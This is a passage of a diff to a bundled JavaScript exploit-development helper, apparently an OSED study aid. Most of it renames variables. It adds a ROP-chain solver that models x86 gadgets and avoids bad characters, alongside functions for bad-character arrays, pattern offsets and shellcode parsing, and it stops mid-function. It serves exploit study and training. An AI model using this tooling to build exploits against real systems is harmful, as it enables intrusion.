@@ -343,8 +343,8 @@ var osed_bundle = (() => {
       if (/^[0-9]+$/.test(trimmed)) {
         throw new Error("Decimal address strings are not allowed.");
       }
-      const hex9 = trimmed.startsWith("0x") ? trimmed : `0x${trimmed}`;
-      return __bi(hex9);
+      const hex10 = trimmed.startsWith("0x") ? trimmed : `0x${trimmed}`;
+      return __bi(hex10);
     }
     throw new Error("Address must be a number or hex string.");
   }
@@ -603,13 +603,13 @@ var osed_bundle = (() => {
     if (!/^(0x)?[0-9a-fA-F]+$/.test(value)) {
       throw new Error("String pattern_offset value must be raw hex only.");
     }
-    const hex9 = value.startsWith("0x") ? value.slice(2) : value;
-    if (hex9.length % 2 !== 0) {
+    const hex10 = value.startsWith("0x") ? value.slice(2) : value;
+    if (hex10.length % 2 !== 0) {
       throw new Error("Hex string length must be even.");
     }
     const chars = [];
-    for (let i = 0; i < hex9.length; i += 2) {
-      chars.push(parseInt(hex9.slice(i, i + 2), 16));
+    for (let i = 0; i < hex10.length; i += 2) {
+      chars.push(parseInt(hex10.slice(i, i + 2), 16));
     }
     return String.fromCharCode(...chars.reverse());
   }
@@ -2650,15 +2650,15 @@ var osed_bundle = (() => {
         const expected = expectedBytes(normalizedExclude.values);
         const python = formatByteArray(expected, "python");
         const c2 = formatByteArray(expected, "c");
-        const hex9 = formatByteArray(expected, "hex");
+        const hex10 = formatByteArray(expected, "hex");
         section("Bad Character Test Array");
         info(`Bytes: ${expected.length} (excluded ${normalizedExclude.values.length})`);
         print(`Python: ${python}`);
         print(`C:      ${c2}`);
-        print(`Hex:    ${hex9}`);
+        print(`Hex:    ${hex10}`);
         whyItMatters("Send this array to the target, then use badchar_find to locate it in memory and see which bytes were mangled.");
         const warnings = normalizedExclude.warning ? [normalizedExclude.warning] : [];
-        return result("badchar_array", __spreadProps(__spreadValues({}, options), { exclude: normalizedExclude.values }), [{ count: expected.length, exclude: normalizedExclude.values, bytes: expected, formats: { python, c: c2, hex: hex9 } }], warnings);
+        return result("badchar_array", __spreadProps(__spreadValues({}, options), { exclude: normalizedExclude.values }), [{ count: expected.length, exclude: normalizedExclude.values, bytes: expected, formats: { python, c: c2, hex: hex10 } }], warnings);
       }
     };
   }
@@ -4749,8 +4749,8 @@ var osed_bundle = (() => {
     const instructions = gadget.instructions;
     if (instructions.length < 2)
       return void 0;
-    const imm = retImmBytes(gadget);
-    if (imm < 0)
+    const imm2 = retImmBytes(gadget);
+    if (imm2 < 0)
       return void 0;
     const registers = [];
     for (let index = 0; index < instructions.length - 1; index += 1) {
@@ -4759,7 +4759,7 @@ var osed_bundle = (() => {
         return void 0;
       registers.push(step.operands[0].trim().toLowerCase());
     }
-    return { registers, retImm: imm };
+    return { registers, retImm: imm2 };
   }
   function valueComment(register2, value) {
     return `${register2} = 0x${(value >>> 0).toString(16).toUpperCase().padStart(8, "0")}`;
@@ -5313,17 +5313,17 @@ var osed_bundle = (() => {
         continue;
       }
       if ((mnemonic === "add" || mnemonic === "sub") && rawDst === "esp") {
-        const imm = parseImmediate(insn.operands[1]);
-        if (imm === void 0 || imm % 4 !== 0) {
+        const imm2 = parseImmediate(insn.operands[1]);
+        if (imm2 === void 0 || imm2 % 4 !== 0) {
           markUnsafe(`${mnemonic} esp, ${(_c = insn.operands[1]) != null ? _c : "?"} is not a paddable 4-byte multiple`);
           continue;
         }
         if (mnemonic === "sub") {
-          markUnsafe(`sub esp, 0x${imm.toString(16)} shifts ESP back into consumed stack`);
+          markUnsafe(`sub esp, 0x${imm2.toString(16)} shifts ESP back into consumed stack`);
           continue;
         }
-        for (let k = 0; k < imm / 4; k++) {
-          fillers.push({ kind: "value", value: 1094795585, comment: `junk (add esp, 0x${imm.toString(16)})` });
+        for (let k = 0; k < imm2 / 4; k++) {
+          fillers.push({ kind: "value", value: 1094795585, comment: `junk (add esp, 0x${imm2.toString(16)})` });
         }
         continue;
       }
@@ -5820,13 +5820,13 @@ var osed_bundle = (() => {
         continue;
       }
       if ((mnemonic === "add" || mnemonic === "sub") && rawDst === "esp") {
-        const imm = parseImmediate2(insn.operands[1]);
-        if (imm === void 0 || imm % 4 !== 0 || mnemonic === "sub") {
+        const imm2 = parseImmediate2(insn.operands[1]);
+        if (imm2 === void 0 || imm2 % 4 !== 0 || mnemonic === "sub") {
           safe = false;
           continue;
         }
-        for (let k = 0; k < imm / 4; k++) {
-          espFillers.push({ kind: "value", value: 1094795585, comment: `junk (add esp, 0x${imm.toString(16)})` });
+        for (let k = 0; k < imm2 / 4; k++) {
+          espFillers.push({ kind: "value", value: 1094795585, comment: `junk (add esp, 0x${imm2.toString(16)})` });
         }
         continue;
       }
@@ -6101,8 +6101,8 @@ var osed_bundle = (() => {
         return false;
       if (op(g, 0, 0) !== "eax")
         return false;
-      const imm = op(g, 0, 1);
-      return imm === "0x4" || imm === "4";
+      const imm2 = op(g, 0, 1);
+      return imm2 === "0x4" || imm2 === "4";
     });
     const gadget = pickBest(cands);
     if (!gadget)
@@ -7011,8 +7011,8 @@ var osed_bundle = (() => {
     if (first.mnemonic === "add" && first.operands.length === 2) {
       const dst = first.operands[0].trim().toLowerCase();
       if (dst === "esp") {
-        const imm = first.operands[1].trim();
-        const val = imm.startsWith("0x") ? parseInt(imm, 16) : parseInt(imm, 10);
+        const imm2 = first.operands[1].trim();
+        const val = imm2.startsWith("0x") ? parseInt(imm2, 16) : parseInt(imm2, 10);
         if (Number.isFinite(val)) {
           return { source: "esp-adjust", adjustment: val, clobbers: ["esp"] };
         }
@@ -7021,8 +7021,8 @@ var osed_bundle = (() => {
     if (first.mnemonic === "sub" && first.operands.length === 2) {
       const dst = first.operands[0].trim().toLowerCase();
       if (dst === "esp") {
-        const imm = first.operands[1].trim();
-        const val = imm.startsWith("0x") ? parseInt(imm, 16) : parseInt(imm, 10);
+        const imm2 = first.operands[1].trim();
+        const val = imm2.startsWith("0x") ? parseInt(imm2, 16) : parseInt(imm2, 10);
         if (Number.isFinite(val)) {
           return { source: "esp-adjust", adjustment: -val, clobbers: ["esp"] };
         }
@@ -7798,8 +7798,8 @@ var osed_bundle = (() => {
           const immMatch = /^(?:0x)?([0-9a-f]+)$/i.exec((_h = ops[1]) != null ? _h : "");
           if (immMatch && regs[reg] && /^0x[0-9A-F]+$/i.test(regs[reg])) {
             const current = parseInt(regs[reg].replace(/^0x/i, ""), 16) >>> 0;
-            const imm = parseInt(immMatch[1], 16) >>> 0;
-            const result3 = m === "add" ? current + imm >>> 0 : current - imm >>> 0;
+            const imm2 = parseInt(immMatch[1], 16) >>> 0;
+            const result3 = m === "add" ? current + imm2 >>> 0 : current - imm2 >>> 0;
             regs[reg] = hex323(result3);
           } else {
             regs[reg] = "?";
@@ -8121,8 +8121,8 @@ var osed_bundle = (() => {
     const raw = text.trim().toLowerCase();
     if (/^-?0x[0-9a-f]+$/.test(raw)) {
       const negative = raw.startsWith("-");
-      const hex9 = negative ? raw.slice(3) : raw.slice(2);
-      const parsed = Number.parseInt(hex9, 16);
+      const hex10 = negative ? raw.slice(3) : raw.slice(2);
+      const parsed = Number.parseInt(hex10, 16);
       if (!Number.isFinite(parsed)) {
         return void 0;
       }
@@ -8255,9 +8255,9 @@ var osed_bundle = (() => {
       name: "ret",
       match: (instruction) => instruction.mnemonic === "ret",
       evaluate: (instruction) => {
-        const imm = immediateOperand(instruction);
-        const delta = imm === void 0 ? 4 : 4 + imm;
-        const evidence = imm === void 0 ? ["RET pops return address"] : [`RET ${imm} adjusts stack by ${delta}`];
+        const imm2 = immediateOperand(instruction);
+        const delta = imm2 === void 0 ? 4 : 4 + imm2;
+        const evidence = imm2 === void 0 ? ["RET pops return address"] : [`RET ${imm2} adjusts stack by ${delta}`];
         return {
           reads: ["esp"],
           writes: ["esp"],
@@ -8382,12 +8382,12 @@ var osed_bundle = (() => {
         if (!isRegisterOperand(left) || right.kind !== "immediate") {
           return {};
         }
-        const imm = parseImmediateValue(right.text);
+        const imm2 = parseImmediateValue(right.text);
         return {
           reads: [left.register],
           writes: [left.register],
-          stackDelta: stackDeltaForRegisterImmediate(left.register, imm),
-          registerEffects: { [left.register]: imm === void 0 ? unknownExpr() : selfPlus(imm) },
+          stackDelta: stackDeltaForRegisterImmediate(left.register, imm2),
+          registerEffects: { [left.register]: imm2 === void 0 ? unknownExpr() : selfPlus(imm2) },
           evidence: [`ADD ${left.register}, ${right.text}`]
         };
       }
@@ -8418,12 +8418,12 @@ var osed_bundle = (() => {
         if (!isRegisterOperand(left) || right.kind !== "immediate") {
           return {};
         }
-        const imm = parseImmediateValue(right.text);
+        const imm2 = parseImmediateValue(right.text);
         return {
           reads: [left.register],
           writes: [left.register],
-          stackDelta: stackDeltaForRegisterImmediate(left.register, imm === void 0 ? void 0 : -imm),
-          registerEffects: { [left.register]: imm === void 0 ? unknownExpr() : selfPlus(-imm) },
+          stackDelta: stackDeltaForRegisterImmediate(left.register, imm2 === void 0 ? void 0 : -imm2),
+          registerEffects: { [left.register]: imm2 === void 0 ? unknownExpr() : selfPlus(-imm2) },
           evidence: [`SUB ${left.register}, ${right.text}`]
         };
       }
@@ -12164,10 +12164,10 @@ var osed_bundle = (() => {
         value = true ? "1.0.4" : globalThis[key2];
         break;
       case "__OSED_BUILD_TIME__":
-        value = true ? "2026-11-22T19:15:49.357Z" : globalThis[key2];
+        value = true ? "2026-11-22T22:28:31.843Z" : globalThis[key2];
         break;
       case "__OSED_GIT_COMMIT__":
-        value = true ? "3b340a0a2541" : globalThis[key2];
+        value = true ? "72b17dd082f7" : globalThis[key2];
         break;
     }
     return typeof value === "string" && value.length > 0 ? value : fallback;
@@ -13395,13 +13395,13 @@ var osed_bundle = (() => {
     if (typeof raw !== "string" || !raw.trim()) {
       throw new Error("shellcode must be a non-empty hex string or byte array.");
     }
-    const hex9 = raw.replace(/[^0-9a-fA-F]/g, "");
-    if (hex9.length % 2 !== 0) {
+    const hex10 = raw.replace(/[^0-9a-fA-F]/g, "");
+    if (hex10.length % 2 !== 0) {
       throw new Error("shellcode hex string must have an even number of hex digits.");
     }
     const result3 = [];
-    for (let i = 0; i < hex9.length; i += 2) {
-      result3.push(parseInt(hex9.slice(i, i + 2), 16));
+    for (let i = 0; i < hex10.length; i += 2) {
+      result3.push(parseInt(hex10.slice(i, i + 2), 16));
     }
     return result3;
   }
@@ -14368,18 +14368,18 @@ var osed_bundle = (() => {
       if (!decoded || decoded.rm === void 0)
         return void 0;
       const immediateOffset = offset + 1 + decoded.length;
-      const imm = signedDword(bytes, immediateOffset);
-      if (imm === void 0)
+      const imm2 = signedDword(bytes, immediateOffset);
+      if (imm2 === void 0)
         return void 0;
       const op5 = b1 >> 3 & 7;
-      return { length: 1 + decoded.length + 4, mnemonic: `${GRP1_NAMES[op5]} ${REG_NAMES[decoded.rm]}, ${formatHex(imm)}` };
+      return { length: 1 + decoded.length + 4, mnemonic: `${GRP1_NAMES[op5]} ${REG_NAMES[decoded.rm]}, ${formatHex(imm2)}` };
     }
     for (const entry of ALU_EAX_IMM32) {
       if (b0 === entry.opcode) {
         if (offset + 4 >= bytes.length)
           return void 0;
-        const imm = bytes[offset + 1] | bytes[offset + 2] << 8 | bytes[offset + 3] << 16 | bytes[offset + 4] << 24 >>> 0;
-        return { length: 5, mnemonic: `${entry.name} eax, ${formatHex(imm >>> 0)}` };
+        const imm2 = bytes[offset + 1] | bytes[offset + 2] << 8 | bytes[offset + 3] << 16 | bytes[offset + 4] << 24 >>> 0;
+        return { length: 5, mnemonic: `${entry.name} eax, ${formatHex(imm2 >>> 0)}` };
       }
     }
     return void 0;
@@ -14522,7 +14522,7 @@ var osed_bundle = (() => {
       stats: { terminatorsFound, dispatchFound, nonSequentialRejected, gadgetsDiscovered: gadgets.length, candidateLimit: maxResults, stoppedEarly: 0 }
     };
   }
-  function findEncodings(module, encodings, clean, keep) {
+  function findEncodings(module, encodings, clean2, keep) {
     var _a2;
     const byFirst = {};
     encodings.forEach((encoding, index) => {
@@ -14546,7 +14546,7 @@ var osed_bundle = (() => {
             if (i + encoding.length > bytes.length || encoding.some((byte, j) => byte >= 0 && bytes[i + j] !== byte))
               continue;
             const address = start + __bi(i);
-            if (!clean(address)) {
+            if (!clean2(address)) {
               result3.dirty[index] += 1;
               continue;
             }
@@ -14565,6 +14565,811 @@ var osed_bundle = (() => {
     }
     return result3;
   }
+
+  // src/rop/reach.ts
+  var REGS2 = ["eax", "ecx", "edx", "ebx", "esi", "edi", "ebp"];
+  var MAX_HOPS = 8;
+  var MAX_NODES = 4e4;
+  var MAX_STACK_SKIP = 16384;
+  var LARGE_STACK_MOVE = 64;
+  var MASK = (v) => v >>> 0;
+  var hex5 = (v) => `0x${MASK(v).toString(16).toUpperCase().padStart(8, "0")}`;
+  var clean = (v, bad) => [0, 8, 16, 24].every((s) => bad.indexOf(MASK(v) >>> s & 255) < 0);
+  var SUB = {
+    ax: "eax",
+    al: "eax",
+    ah: "eax",
+    cx: "ecx",
+    cl: "ecx",
+    ch: "ecx",
+    dx: "edx",
+    dl: "edx",
+    dh: "edx",
+    bx: "ebx",
+    bl: "ebx",
+    bh: "ebx",
+    si: "esi",
+    di: "edi",
+    bp: "ebp"
+  };
+  var isReg = (s) => REGS2.indexOf(s) >= 0;
+  var NO_EFFECT = ["nop", "cmp", "test", "clc", "stc", "cld", "cmc", "fwait", "wait", "fnop", "bt"];
+  var CLOBBER_FIRST = [
+    "and",
+    "or",
+    "imul",
+    "shl",
+    "shr",
+    "sar",
+    "sal",
+    "rol",
+    "ror",
+    "rcl",
+    "rcr",
+    "bswap",
+    "adc",
+    "sbb",
+    "movzx",
+    "movsx",
+    "cmove",
+    "cmovne",
+    "cmovz",
+    "cmovnz",
+    "cmova",
+    "cmovb",
+    "cmovae",
+    "cmovbe",
+    "cmovg",
+    "cmovl",
+    "cmovge",
+    "cmovle",
+    "cmovs",
+    "cmovns",
+    "sete",
+    "setne",
+    "setz",
+    "setnz",
+    "seta",
+    "setb",
+    "bsf",
+    "bsr",
+    "xadd"
+  ];
+  var imm = (s) => {
+    const t = s.replace(/^(dword|word|byte)\s+/, "");
+    if (/^-?0x[0-9a-f]+$/.test(t))
+      return MASK(parseInt(t, 16));
+    if (/^-?[0-9]+$/.test(t))
+      return MASK(parseInt(t, 10));
+    return void 0;
+  };
+  function memOperand(s) {
+    var _a2;
+    const m = /^(?:(dword|word|byte|qword)\s+(?:ptr\s+)?)?(?:[a-z]s:)?\[([^\]]+)\]$/.exec(s);
+    if (!m)
+      return void 0;
+    const inner = m[2].replace(/\s+/g, "");
+    const b = /^([a-z]{3})(?:([+-])(0x[0-9a-f]+|[0-9]+))?$/.exec(inner);
+    if (!b || !isReg(b[1]) && b[1] !== "esp")
+      return "complex";
+    const off = b[3] ? parseInt(b[3], b[3].indexOf("0x") === 0 ? 16 : 10) * (b[2] === "-" ? -1 : 1) : 0;
+    return { base: b[1], off, size: (_a2 = m[1]) != null ? _a2 : "dword" };
+  }
+  var memIds = 0;
+  function simplify(e) {
+    switch (e.op) {
+      case "add":
+      case "sub":
+      case "xor": {
+        const a = simplify(e.a);
+        const b = simplify(e.b);
+        if (a.op === "unknown" || b.op === "unknown")
+          return { op: "unknown" };
+        if (a.op === "const" && b.op === "const")
+          return { op: "const", v: MASK(e.op === "add" ? a.v + b.v : e.op === "sub" ? a.v - b.v : a.v ^ b.v) };
+        if (b.op === "const" && b.v === 0)
+          return a;
+        if (e.op === "add" && a.op === "const" && a.v === 0)
+          return b;
+        if (e.op === "sub" && a.op === "const" && b.op !== "const")
+          return simplify({ op: "add", a: { op: "neg", a: b }, b: a });
+        if (e.op !== "xor" && b.op === "const" && (a.op === "add" || a.op === "sub") && a.b.op === "const") {
+          const inner = a.op === "add" ? a.b.v : -a.b.v;
+          const total = MASK(inner + (e.op === "add" ? b.v : -b.v));
+          return simplify({ op: "add", a: a.a, b: { op: "const", v: total } });
+        }
+        if (e.op === "add" && a.op === "const")
+          return { op: "add", a: b, b: a };
+        if (e.op === "sub" && b.op === "const")
+          return { op: "add", a, b: { op: "const", v: MASK(-b.v) } };
+        if (e.op === "xor" && a.op === "reg" && b.op === "reg" && a.r === b.r)
+          return { op: "const", v: 0 };
+        return { op: e.op, a, b };
+      }
+      case "neg":
+      case "not": {
+        const a = simplify(e.a);
+        if (a.op === "unknown")
+          return a;
+        if (a.op === "const")
+          return { op: "const", v: MASK(e.op === "neg" ? -a.v : ~a.v) };
+        if (a.op === e.op)
+          return a.a;
+        return { op: e.op, a };
+      }
+      case "mem": {
+        const a = simplify(e.a);
+        return a.op === "unknown" ? a : a === e.a ? e : { op: "mem", a, id: e.id };
+      }
+      default:
+        return e;
+    }
+  }
+  function effectOf(gadget) {
+    var _a2;
+    const regs = {};
+    for (const r of REGS2)
+      regs[r] = { op: "reg", r };
+    const written = /* @__PURE__ */ new Set();
+    const pushed = {};
+    const reads = [];
+    const stores = [];
+    let sp = 0;
+    let deepest = 0;
+    const value = (s) => {
+      if (isReg(s))
+        return regs[s];
+      const n = imm(s);
+      if (n !== void 0)
+        return { op: "const", v: n };
+      return void 0;
+    };
+    const stackAt = (off) => {
+      if (off % 4 !== 0)
+        return void 0;
+      if (pushed[off] !== void 0)
+        return pushed[off];
+      if (off < 0)
+        return void 0;
+      deepest = Math.max(deepest, off / 4 + 1);
+      return { op: "slot", i: off / 4 };
+    };
+    const read = (m) => {
+      if (m.base === "esp")
+        return stackAt(sp + m.off);
+      const node = { op: "mem", a: simplify({ op: "add", a: regs[m.base], b: { op: "const", v: MASK(m.off) } }), id: ++memIds };
+      reads.push(node.id);
+      return node;
+    };
+    const set = (r, e) => {
+      regs[r] = e === void 0 ? { op: "unknown" } : simplify(e);
+      written.add(r);
+    };
+    const ins = gadget.instructions;
+    for (let n = 0; n < ins.length; n += 1) {
+      const mnemonic = ins[n].mnemonic.toLowerCase();
+      const ops = ins[n].operands.map((o) => o.trim().toLowerCase());
+      const [d, s] = ops;
+      const dm = d !== void 0 ? memOperand(d) : void 0;
+      const sm = s !== void 0 ? memOperand(s) : void 0;
+      if (mnemonic === "ret" || mnemonic === "retn") {
+        if (n !== ins.length - 1 || sp < 0 || pushed[sp] !== void 0)
+          return void 0;
+        break;
+      }
+      if (ops.indexOf("esp") >= 0 || ops.indexOf("sp") >= 0) {
+        if (mnemonic === "add" && d === "esp" && imm(s != null ? s : "") !== void 0 && imm(s != null ? s : "") % 4 === 0 && imm(s != null ? s : "") < MAX_STACK_SKIP) {
+          sp += imm(s != null ? s : "");
+          deepest = Math.max(deepest, sp / 4);
+          continue;
+        }
+        if (mnemonic === "push" && d === "esp") {
+          sp -= 4;
+          pushed[sp] = { op: "unknown" };
+          continue;
+        }
+        return void 0;
+      }
+      if (dm === "complex" || sm === "complex") {
+        if (dm !== void 0)
+          return void 0;
+        if (!d || !(isReg(d) || SUB[d]))
+          return void 0;
+        if (mnemonic !== "lea")
+          reads.push(++memIds);
+        set(isReg(d) ? d : SUB[d], void 0);
+        continue;
+      }
+      if (NO_EFFECT.indexOf(mnemonic) >= 0) {
+        if (sm && typeof sm === "object" && sm.base !== "esp")
+          reads.push(++memIds);
+        if (dm && typeof dm === "object" && dm.base !== "esp")
+          reads.push(++memIds);
+        continue;
+      }
+      if (mnemonic === "pop") {
+        if (!d || !isReg(d))
+          return void 0;
+        set(d, stackAt(sp));
+        if (regs[d].op === "unknown")
+          return void 0;
+        sp += 4;
+        continue;
+      }
+      if (mnemonic === "push") {
+        if (!d)
+          return void 0;
+        let v = value(d);
+        if (!v && dm && typeof dm === "object")
+          v = read(dm);
+        if (!v)
+          return void 0;
+        sp -= 4;
+        pushed[sp] = v;
+        continue;
+      }
+      if (dm && typeof dm === "object") {
+        if (mnemonic !== "mov" || dm.size !== "dword" || dm.base === "esp" || !s)
+          return void 0;
+        const v = value(s);
+        if (!v)
+          return void 0;
+        stores.push({ at: simplify({ op: "add", a: regs[dm.base], b: { op: "const", v: MASK(dm.off) } }), value: v });
+        continue;
+      }
+      if (!d)
+        return void 0;
+      const target = isReg(d) ? d : SUB[d];
+      if (!target)
+        return void 0;
+      if (mnemonic === "xadd" && s !== void 0 && (isReg(s) || SUB[s]))
+        set(isReg(s) ? s : SUB[s], void 0);
+      else if (mnemonic === "xadd")
+        return void 0;
+      if ((mnemonic === "imul" || mnemonic === "mul" || mnemonic === "div" || mnemonic === "idiv") && ops.length === 1)
+        return void 0;
+      if (!isReg(d)) {
+        if (mnemonic === "xchg")
+          return void 0;
+        if (sm && typeof sm === "object") {
+          if (read(sm) === void 0)
+            return void 0;
+        }
+        set(target, void 0);
+        continue;
+      }
+      const src = () => {
+        var _a3;
+        return sm && typeof sm === "object" ? sm.size === "dword" ? read(sm) : (read(sm), { op: "unknown" }) : s !== void 0 ? (_a3 = value(s)) != null ? _a3 : SUB[s] ? { op: "unknown" } : void 0 : void 0;
+      };
+      switch (mnemonic) {
+        case "mov": {
+          const v = src();
+          if (!v)
+            return void 0;
+          set(d, v);
+          break;
+        }
+        case "lea": {
+          const m = s ? memOperand(s) : void 0;
+          if (!m || m === "complex" || m.base === "esp")
+            return void 0;
+          set(d, { op: "add", a: regs[m.base], b: { op: "const", v: MASK(m.off) } });
+          break;
+        }
+        case "add":
+        case "sub":
+        case "xor": {
+          const v = src();
+          if (!v)
+            return void 0;
+          set(d, { op: mnemonic, a: regs[d], b: v });
+          break;
+        }
+        case "inc":
+          set(d, { op: "add", a: regs[d], b: { op: "const", v: 1 } });
+          break;
+        case "dec":
+          set(d, { op: "add", a: regs[d], b: { op: "const", v: MASK(-1) } });
+          break;
+        case "neg":
+          set(d, { op: "neg", a: regs[d] });
+          break;
+        case "not":
+          set(d, { op: "not", a: regs[d] });
+          break;
+        case "xchg": {
+          if (!s || !isReg(s))
+            return void 0;
+          const a = regs[d];
+          set(d, regs[s]);
+          set(s, a);
+          break;
+        }
+        default:
+          if (CLOBBER_FIRST.indexOf(mnemonic) >= 0) {
+            if (sm && typeof sm === "object")
+              read(sm);
+            set(d, void 0);
+            break;
+          }
+          return void 0;
+      }
+    }
+    const last = ins[ins.length - 1];
+    if (!last || last.mnemonic !== "ret" && last.mnemonic !== "retn")
+      return void 0;
+    if (deepest > sp / 4)
+      return void 0;
+    const writes2 = {};
+    written.forEach((r) => {
+      const e = regs[r];
+      if (!(e.op === "reg" && e.r === r))
+        writes2[r] = e;
+    });
+    const retOperand = last.operands[0];
+    const retn = retOperand ? (_a2 = imm(retOperand.trim().toLowerCase())) != null ? _a2 : 0 : 0;
+    return { gadget, writes: writes2, reads, stores, slots: Math.max(deepest, sp / 4), retn };
+  }
+  var isLiteral = (text) => /^0x[0-9A-F]{8}$/.test(text);
+  var constVal = (k, text) => ({ k: MASK(k), text: text != null ? text : hex5(k) });
+  var minus = (g, c2, cText) => {
+    const k = MASK(g.k - c2);
+    if (isLiteral(g.text) && (!cText || isLiteral(cText)))
+      return { mem: g.mem, k, text: hex5(k) };
+    if (MASK(c2) === 0)
+      return g;
+    return { mem: g.mem, k, text: c2 > 2147483647 && !cText ? `${g.text} + ${hex5(-c2)}` : `${g.text} - ${cText != null ? cText : hex5(c2)}` };
+  };
+  var negated = (g) => ({ k: MASK(-g.k), text: isLiteral(g.text) ? hex5(-g.k) : `neg(${g.text})` });
+  var inverted = (g) => ({ k: MASK(~g.k), text: isLiteral(g.text) ? hex5(~g.k) : `~(${g.text})` });
+  var xored = (g, x) => ({ k: MASK(g.k ^ x), text: isLiteral(g.text) ? hex5(g.k ^ x) : `(${g.text}) ^ ${hex5(x)}` });
+  function describe(g) {
+    if (!g.mem)
+      return g.text;
+    if (g.k === 0)
+      return `[${g.mem.text}]`;
+    return `[${g.mem.text}] + ${g.text}`;
+  }
+  function cleanPairs(c2, combine, bad, limit = 2) {
+    const found = [];
+    const tryX = (x) => {
+      x = MASK(x);
+      if (found.length < limit && found.indexOf(x) < 0 && clean(x, bad) && clean(combine(c2, x), bad))
+        found.push(x);
+    };
+    for (let b = 1; b <= 255 && found.length < limit; b += 17)
+      tryX(b * 16843009);
+    let seed = 2654435769;
+    for (let i = 0; i < 4e3 && found.length < limit; i += 1) {
+      seed = MASK(seed * 1664525 + 1013904223);
+      tryX(seed);
+    }
+    return found;
+  }
+  var join = (a, b) => {
+    var _a2;
+    return {
+      regs: a.regs.concat(b.regs),
+      slots: a.slots.concat(b.slots),
+      pinned: a.pinned.concat(b.pinned),
+      scratch: (_a2 = a.scratch) != null ? _a2 : b.scratch
+    };
+  };
+  function solve(e, g, opts, depth = 0) {
+    if (depth > 4)
+      return [];
+    const pure = !g.mem;
+    switch (e.op) {
+      case "reg":
+        return [{ regs: [[e.r, g]], slots: [], pinned: [] }];
+      case "slot":
+        return pure && clean(g.k, opts.bad) ? [{ regs: [], slots: [[e.i, g.k, g.text]], pinned: [] }] : [];
+      case "const":
+        return pure && MASK(e.v) === g.k ? [{ regs: [], slots: [], pinned: [] }] : [];
+      case "unknown":
+        return [];
+      case "neg":
+        return pure ? solve(e.a, negated(g), opts, depth + 1) : [];
+      case "not":
+        return pure ? solve(e.a, inverted(g), opts, depth + 1) : [];
+      case "mem": {
+        const out = [];
+        if (g.mem && g.k === 0) {
+          for (const need of solve(e.a, constVal(g.mem.at, g.mem.text), opts, depth + 1))
+            out.push(join(need, { regs: [], slots: [], pinned: [e.id] }));
+        }
+        if (opts.scratch && !(g.mem && g.k === 0)) {
+          for (const need of solve(e.a, constVal(opts.scratch.at, opts.scratch.text), opts, depth + 1)) {
+            out.push(join(need, { regs: [], slots: [], pinned: [e.id], scratch: g }));
+          }
+        }
+        return out;
+      }
+      case "add":
+      case "sub":
+      case "xor": {
+        if (e.b.op === "const") {
+          const c2 = e.b.v;
+          const next = e.op === "xor" ? pure ? xored(g, c2) : void 0 : minus(g, e.op === "add" ? c2 : MASK(-c2));
+          const small = MASK(c2) <= 4 || MASK(-c2) <= 4;
+          if (!next || !small && depth === 0 && !(next.mem ? next.k === 0 : clean(next.k, opts.bad) || next.k === 0))
+            return [];
+          return solve(e.a, next, opts, depth + 1);
+        }
+        const splits = [];
+        if (e.op === "add") {
+          if (g.mem) {
+            splits.push([{ mem: g.mem, k: 0, text: "0" }, constVal(g.k, g.text)]);
+            splits.push([constVal(g.k, g.text), { mem: g.mem, k: 0, text: "0" }]);
+          } else {
+            for (const x of cleanPairs(g.k, (c2, x2) => c2 - x2, opts.bad))
+              splits.push([minus(g, x), constVal(x)]);
+            splits.push([g, constVal(0)], [constVal(0), g]);
+          }
+        } else if (e.op === "sub") {
+          if (g.mem)
+            splits.push([{ mem: g.mem, k: 0, text: "0" }, negated(constVal(g.k, g.text))]);
+          else {
+            for (const x of cleanPairs(g.k, (c2, x2) => c2 + x2, opts.bad))
+              splits.push([minus(g, MASK(-x)), constVal(x)]);
+            splits.push([g, constVal(0)]);
+          }
+        } else if (pure) {
+          for (const x of cleanPairs(g.k, (c2, x2) => c2 ^ x2, opts.bad))
+            splits.push([xored(g, x), constVal(x)]);
+        }
+        const out = [];
+        for (const [ga, gb] of splits) {
+          for (const na of solve(e.a, ga, opts, depth + 1))
+            for (const nb of solve(e.b, gb, opts, depth + 1))
+              out.push(join(na, nb));
+          if (out.length >= 6)
+            break;
+        }
+        return out;
+      }
+    }
+  }
+  var estimate = (node) => node.cost + 1e3 * (node.regs.size + (node.scratch ? 1 : 0));
+  var sameVal = (a, b) => {
+    var _a2, _b, _c, _d;
+    return a.k === b.k && ((_b = (_a2 = a.mem) == null ? void 0 : _a2.at) != null ? _b : -1) === ((_d = (_c = b.mem) == null ? void 0 : _c.at) != null ? _d : -1);
+  };
+  var keyOf = (node) => {
+    const parts = [];
+    node.regs.forEach((v, r) => parts.push(`${r}=${v.mem ? `[${v.mem.at}]` : ""}${v.k}`));
+    parts.sort();
+    if (node.scratch)
+      parts.push(`M=${node.scratch.mem ? `[${node.scratch.mem.at}]` : ""}${node.scratch.k}`);
+    return parts.join(",");
+  };
+  function show(e, slots) {
+    var _a2;
+    switch (e.op) {
+      case "reg":
+        return e.r;
+      case "slot":
+        return (_a2 = slots.get(e.i)) != null ? _a2 : "junk";
+      case "const":
+        return hex5(e.v);
+      case "add":
+        return e.b.op === "const" && e.b.v > 2147483647 ? `${show(e.a, slots)} - ${hex5(-e.b.v)}` : `${show(e.a, slots)} + ${show(e.b, slots)}`;
+      case "sub":
+        return `${show(e.a, slots)} - ${show(e.b, slots)}`;
+      case "xor":
+        return `${show(e.a, slots)} ^ ${show(e.b, slots)}`;
+      case "neg":
+        return `-${show(e.a, slots)}`;
+      case "not":
+        return `~${show(e.a, slots)}`;
+      case "mem":
+        return `[${show(e.a, slots)}]`;
+      case "unknown":
+        return "?";
+    }
+  }
+  function kindOf2(e) {
+    switch (e.op) {
+      case "slot":
+        return "pop";
+      case "mem":
+        return "read";
+      case "reg":
+        return "move";
+      case "neg":
+        return "negate";
+      case "not":
+        return "invert";
+      case "xor":
+        return "xor";
+      case "sub":
+        return "subtract";
+      case "add":
+        return e.b.op === "const" ? "adjust" : "add";
+      default:
+        return "set";
+    }
+  }
+  var Heap = class {
+    constructor() {
+      this.items = [];
+    }
+    get size() {
+      return this.items.length;
+    }
+    push(node) {
+      var _a2, _b;
+      const a = this.items;
+      a.push(node);
+      let i = a.length - 1;
+      while (i > 0) {
+        const p = i - 1 >> 1;
+        if (((_a2 = a[p].f) != null ? _a2 : a[p].cost) <= ((_b = a[i].f) != null ? _b : a[i].cost))
+          break;
+        [a[p], a[i]] = [a[i], a[p]];
+        i = p;
+      }
+    }
+    pop() {
+      var _a2, _b, _c, _d;
+      const a = this.items;
+      if (a.length === 0)
+        return void 0;
+      const top = a[0];
+      const last = a.pop();
+      if (a.length > 0) {
+        a[0] = last;
+        let i = 0;
+        for (; ; ) {
+          const l = 2 * i + 1;
